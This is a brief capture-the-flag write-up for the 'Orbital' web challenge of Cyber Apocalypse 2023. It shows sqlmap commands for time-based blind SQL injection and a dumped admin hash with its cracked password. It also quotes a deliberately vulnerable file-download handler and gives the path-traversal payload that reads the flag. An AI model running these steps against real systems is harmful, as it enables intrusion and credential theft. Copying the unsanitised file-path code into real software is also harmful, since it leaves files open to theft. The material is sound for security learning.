---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/ca23/orbital/","tags":["#CyberApocalypse-23","web","sqli"]}
---

We are presented with a login form that POSTs to /api/login so I threw sqlmap at it after I determined it was a time based blind injection:

```bash
sqlmap -r /home/brumbo/Documents/htb/CA23/web_orbital/sqlreq --level 5 --risk 3 -f --banner --dbs --batch --ignore-code 403
```

found db named orbital, dumped it

```bash
[16:17:04] [INFO] fetching database names
[16:17:04] [INFO] resumed: 'information_schema'
[16:17:04] [INFO] resumed: 'test'
[16:17:04] [INFO] resumed: 'orbital'
available databases [3]:
[*] information_schema
[*] orbital
[*] test

```

```bash
sqlmap -r /home/brumbo/Documents/htb/CA23/web_orbital/sqlreq --level 5 --risk 3 -f --banner --dbs orbital --batch --ignore-code 403
```

got admin hash which sqlmap cracked:

```

Database: orbital                                                                                  
Table: users
[1 entry]
+----+-------------------------------------------------+----------+
| id | password                                        | username |
+----+-------------------------------------------------+----------+
| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
+----+-------------------------------------------------+----------+
```

then you can change the file being exported, flag at `/signal_sleuth_firmware`  
because:

```python
try:

# Everyone is saying I should escape specific characters in the filename. I don't know why.

return send_file(f'/communications/{communicationName}', as_attachment=True)
```

so,

```json
{"name":"../signal_sleuth_firmware"}
```

`HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}`